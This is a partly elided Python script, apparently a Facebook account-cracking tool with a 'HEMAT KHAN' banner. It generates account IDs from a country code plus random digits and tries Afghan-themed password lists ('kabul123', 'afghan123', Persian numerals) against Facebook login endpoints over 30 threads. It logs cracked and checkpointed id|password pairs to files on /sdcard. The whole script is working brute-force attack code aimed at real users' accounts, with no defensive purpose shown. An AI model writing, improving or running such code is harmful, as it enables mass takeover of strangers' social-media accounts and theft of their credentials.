...
##     ## ######## ##     ## ##     ##    ##
 ...
 Facebook:             HEMAT KHAN
 Github  :             HemtKhan
 STATUS  :             \033[1;92mEID MUBARK \033[0m 
 Version :             \033[96m0.7\033[0m
------------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                print(f'NOT WORKING NOW COMING SOON 🤕')
...
def pak():
                ...
                with tred(max_workers=30) as HEMAT:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'afghan123','۵۰۰۵۰۰','۱۰۰۲۰۰','500500','100200','10002000','Afghanistan','900900','kabul123']
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [HEMAT-KHAN] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in HEMAT:
                                ...
                                print('\r\r\033[1;32m [HEMAT-OK] %s | %s'%(ids,pas))
                                open('/sdcard/KHAN-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in HEMAT:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [HEMAT-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/HEMAT-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                ...
                try:
                        ...
                        for pw in passlist:
                                ...
                                data = {'adid':adid,
                                        ...
                                        "locale":"af_AF","client_country_code":"AF",
                                        'device':gtt,
                                        'device_id':adid,
                                        "method": "auth.login",
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [HEMAT-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/KHAN-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
...
def api1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [HEMAT-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
...
def rndm(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [HEMAT] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                if uid in okk:pass
                                                        ...
                                                        print('\r\r\033[1;32m [HEMAT-OK] '+uid+' | '+pas+'\033[1;97m')
